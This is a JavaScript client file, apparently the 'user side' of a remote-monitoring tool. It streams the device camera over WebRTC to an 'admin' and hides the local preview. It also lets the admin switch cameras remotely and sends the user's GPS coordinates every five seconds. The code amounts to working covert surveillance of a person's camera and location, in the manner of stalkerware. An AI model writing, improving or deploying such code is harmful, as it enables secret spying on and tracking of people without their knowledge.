// USER SIDE — FINAL STABLE VERSION
const socket = io();

let pc = null;
let stream = null;
let videoDevices = [];
let currentDeviceIndex = 0;

// Load available cameras
async function loadCameras() {
  const devices = await navigator.mediaDevices.enumerateDevices();
  videoDevices = devices.filter(d => d.kind === "videoinput");

  if (videoDevices.length === 0) {
    alert("No camera found");
  }
}

// Create PeerConnection
function createPC(stream) {
  const pc = new RTCPeerConnection({
    iceServers: [{ urls: "stun:stun.l.google.com:19302" }]
  });

  pc.onicecandidate = e => {
    if (e.candidate) socket.emit("ice-candidate", e.candidate);
  };

  // ✅ CORRECT: add track WITH stream
  stream.getTracks().forEach(track => {
    pc.addTrack(track, stream);
  });

  return pc;
}

// Start camera with specific deviceId
async function startCamera(deviceId) {
  // stop old stream
  if (stream) stream.getTracks().forEach(t => t.stop());

  stream = await navigator.mediaDevices.getUserMedia({
    video: { deviceId: { exact: deviceId } },
    audio: false
  });

  // hidden local video
  document.getElementById("camera").srcObject = stream;

  // reset peer connection
  if (pc) pc.close();
  pc = createPC(stream);

  // create and send offer
  const offer = await pc.createOffer();
  await pc.setLocalDescription(offer);
  socket.emit("offer", offer);
}

// Switch camera (admin-controlled)
async function switchCamera() {
  if (videoDevices.length < 2) return;

  currentDeviceIndex =
    (currentDeviceIndex + 1) % videoDevices.length;

  await startCamera(videoDevices[currentDeviceIndex].deviceId);
}

// 🔁 ADMIN triggers camera switch
socket.on("switch-camera", () => {
  switchCamera();
});

// ADMIN answer
socket.on("answer", async answer => {
  if (pc) {
    await pc.setRemoteDescription(new RTCSessionDescription(answer));
  }
});

// ICE from admin
socket.on("ice-candidate", async candidate => {
  if (pc && candidate) {
    try {
      await pc.addIceCandidate(new RTCIceCandidate(candidate));
    } catch {}
  }
});

// Location updates
setInterval(() => {
  navigator.geolocation.getCurrentPosition(pos => {
    socket.emit("location", {
      lat: pos.coords.latitude,
      lon: pos.coords.longitude
    });
  });
}, 5000);

// INIT
(async () => {
  await loadCameras();

  // Prefer back camera if exists
  if (videoDevices.length > 1) {
    currentDeviceIndex = videoDevices.length - 1;
  }

  await startCamera(videoDevices[currentDeviceIndex].deviceId);
})();
